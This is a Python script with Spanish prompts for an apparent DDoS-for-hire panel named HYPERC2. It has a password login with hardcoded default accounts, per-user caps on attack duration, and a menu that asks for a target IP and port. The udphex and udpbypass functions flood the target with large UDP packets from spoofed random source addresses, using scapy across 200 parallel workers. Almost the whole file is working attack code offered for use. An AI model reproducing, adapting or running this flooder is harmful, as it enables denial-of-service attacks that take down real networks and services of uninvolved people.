import random
import os
from scapy.all import IP, UDP, Raw, send
from time import time
from random import randint
from multiprocessing import Pool
from colorama import init, Fore

init(autoreset=True)
WHITE = Fore.WHITE
YELLOW = Fore.YELLOW
GREEN = "\033[92m"
RED = Fore.RED

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def show_banner():
    clear()
    print(f"""{YELLOW}
██░ ██▓██   ██▓ ██▓███  ▓█████  ██▀███  
▓██░ ██▒▒██  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░ ▒██ ██░▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
░▓█ ░██  ░ ▐██▓░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓ ░ ██▒▓░▒██▒ ░  ░░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒  ██▒▒▒ ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░▓██ ░▒░ ░▒ ░      ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░▒ ▒ ░░  ░░          ░     ░░   ░ 
 ░  ░  ░░ ░                 ░  ░   ░     
        ░ ░                           
{WHITE}ES HORA DEL SHOW {YELLOW}HYPERC2 TOTAL POWER!!
""")

def spoofed_ip():
    # Genera una dirección IP aleatoria (spoofing)
    return f"{randint(11, 250)}.{randint(1, 254)}.{randint(1, 254)}.{randint(2, 254)}"

def generate_payload(size=2048):
    # Genera un payload aleatorio más grande
    return bytes.fromhex("ff aa 01 fe de ad be ef") * (size // 8)

def udphex(ip, port, duration, user):
    """
    Enviar un ataque UDP con un payload hexadecimal más grande.
    """
    # Limitar duración según el usuario
    if user == "asky" and duration > 60:
        print(f"{RED}El usuario 'asky' solo puede realizar ataques de hasta 60 segundos.")
        duration = 60
    elif user == "apsx" and duration > 120:
        print(f"{RED}El usuario 'apsx' solo puede realizar ataques de hasta 120 segundos.")
        duration = 120

    payload = generate_payload(4096)  # Payload más grande y complejo
    end = time() + int(duration)

    def flood():
        while time() < end:
            # Aleatoriza la IP de origen (spoofing)
            src_ip = spoofed_ip()
            
            # Usa un puerto aleatorio para el tráfico UDP
            sport = randint(1000, 65535)
            
            # Crea el paquete UDP con el payload hexadecimal más grande
            pkt = IP(src=src_ip, dst=ip) / UDP(sport=sport, dport=int(port)) / Raw(payload)
            
            # Envía el paquete UDP
            send(pkt, verbose=0)

    pool = Pool(processes=200)
    pool.map(lambda _: flood(), range(200))

def udpbypass(ip, port, duration, user):
    """
    Enviar un ataque UDP bypass con IPs spoofed y payload más complejo.
    """
    # Limitar duración según el usuario
    if user == "asky" and duration > 60:
        print(f"{RED}El usuario 'asky' solo puede realizar ataques de hasta 60 segundos.")
        duration = 60
    elif user == "apsx" and duration > 120:
        print(f"{RED}El usuario 'apsx' solo puede realizar ataques de hasta 120 segundos.")
        duration = 120
    
    end = time() + int(duration)

    def flood():
        while time() < end:
            # Aleatoriza la IP de origen (spoofing)
            src_ip = spoofed_ip()

            # Payload más complejo y de mayor tamaño
            payload = generate_payload(2048)
            
            # Usa un puerto aleatorio para el tráfico UDP
            sport = randint(1000, 65535)
            
            # Crea el paquete UDP
            pkt = IP(src=src_ip, dst=ip) / UDP(sport=sport, dport=int(port)) / Raw(payload)
            
            # Envía el paquete UDP
            send(pkt, verbose=0)

    pool = Pool(processes=200)
    pool.map(lambda _: flood(), range(200))

def attack_panel(user):
    clear()
    print(f"{YELLOW}Bienvenido al panel de ataques:\n")
    ip = input(f"{WHITE}Ingrese IP de destino: ")
    port = input(f"{WHITE}Ingrese Puerto de destino: ")
    method = input(f"{WHITE}Ingrese Método (udphex, tcphex, udpbypass): ").lower()
    duration = int(input(f"{WHITE}Ingrese Duración del ataque (en segundos): "))

    if method == "udpbypass":
        print(f"{YELLOW}Iniciando ataque UDP Bypass...\n")
        udpbypass(ip, port, duration, user)
    elif method == "udphex":
        print(f"{YELLOW}Iniciando ataque UDP Hex...\n")
        udphex(ip, port, duration, user)
    else:
        print(f"{YELLOW}Método inválido.\n")
    
    print(f"{GREEN}Ataque completado con éxito!\n")
    again = input(f"{WHITE}¿Desea realizar otro ataque? (s/n): ")
    if again.lower() == "s":
        attack_panel(user)

def main_menu(user):
    while True:
        clear()
        print(f"{YELLOW}(1){WHITE} Panel de Métodos")
        print(f"{YELLOW}(2){WHITE} Panel de Ataques\n")
        choice = input(f"{YELLOW}Selecciona una opción: ")

        if choice == "1":
            print(f"{WHITE}Métodos disponibles: udphex, tcphex, udpbypass")
            input(f"{YELLOW}Presione enter para continuar...")
        elif choice == "2":
            attack_panel(user)
        else:
            print(f"{YELLOW}Opción inválida.")

def login():
    clear()
    print(f"{YELLOW}Bienvenido al sistema\n")
    accounts = read_accounts()
    
    while True:
        user = input(f"{WHITE}username: ")
        passwd = input(f"{WHITE}password: ")
        
        # Verificar si el usuario y la contraseña están en el archivo
        if [user, passwd] in accounts:
            print(f"{GREEN}Login exitoso como {user}")
            break
        else:
            print(f"{RED}Credenciales incorrectas\n")
    return user

def read_accounts():
    """
    Lee el archivo login.txt y devuelve una lista de usuarios y contraseñas válidas.
    El formato de login.txt debe ser `usuario:contraseña` por línea.
    """
    if not os.path.exists("login.txt"):
        with open("login.txt", "w") as f:
            f.write("asky:asky123\napsx:apsxnew\n")  # Definir un archivo de ejemplo
    with open("login.txt", "r") as f:
        return [line.strip().split(":") for line in f if ':' in line]

def main():
    user = login()  # El login leerá directamente del archivo
    show_banner()  # Mostrar el banner
    main_menu(user)

if __name__ == "__main__":
    main()
